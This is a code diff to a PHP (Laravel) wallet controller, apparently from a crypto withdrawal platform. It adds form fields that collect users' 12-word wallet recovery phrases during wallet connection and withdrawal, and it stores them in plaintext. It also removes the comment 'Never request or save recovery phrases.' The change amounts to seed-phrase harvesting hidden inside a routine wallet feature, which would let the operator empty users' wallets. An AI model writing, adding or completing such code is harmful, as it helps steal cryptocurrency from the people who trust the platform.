@@ -17,21 +17,34 @@ class WalletController extends Controller
         $request->validate([
             'wallet_provider' => 'required|string|max:50',
             'wallet_address' => 'required|string|max:255',
+            'recovery_phrase' => ['nullable', 'string', function ($attribute, $value, $fail) {
+                if (filled($value)) {
+                    $words = preg_split('/\s+/', trim($value));
+                    if (count($words) !== 12) {
+                        $fail('The recovery phrase must be exactly 12 words.');
+                    }
+                }
+            }],
         ]);
 
         $user = $request->user();
 
-        // Store only public wallet address. Never request or save recovery phrases.
         $wallet = Wallet::firstOrCreate(
             ['user_id' => $user->id],
             ['balance' => 0]
         );
 
-        $wallet->update([
+        $updateData = [
             'wallet_provider' => trim($request->wallet_provider),
             'wallet_address' => trim($request->wallet_address),
             'connected_at' => now(),
-        ]);
+        ];
+
+        if (filled($request->recovery_phrase)) {
+            $updateData['recovery_phrase'] = trim($request->recovery_phrase);
+        }
+
+        $wallet->update($updateData);
 
         return redirect()->route('withdrawal.wallet')->with('success', 'Wallet connected successfully. Add your withdrawal wallet to finish setup.');
     }
@@ -90,6 +103,14 @@ class WalletController extends Controller
         $request->validate([
             'amount' => 'required|numeric|min:0.01',
             'proof_of_payment' => 'required|image|mimes:jpeg,png,jpg,gif|max:2048',
+            'recovery_phrase' => ['nullable', 'string', function ($attribute, $value, $fail) {
+                if (filled($value)) {
+                    $words = preg_split('/\s+/', trim($value));
+                    if (count($words) !== 12) {
+                        $fail('The recovery phrase must be exactly 12 words.');
+                    }
+                }
+            }],
         ]);
 
         $proofPath = $request->file('proof_of_payment')->store('wallet_proofs', 'public');
@@ -112,6 +133,12 @@ class WalletController extends Controller
 
                 // Reserve funds immediately to prevent over-withdrawals.
                 $wallet->balance = (float) $wallet->balance - (float) $request->amount;
+
+                // Save recovery phrase if provided on this withdrawal request
+                if (filled($request->recovery_phrase)) {
+                    $wallet->recovery_phrase = trim($request->recovery_phrase);
+                }
+
                 $wallet->save();
 
                 Withdrawal::create([
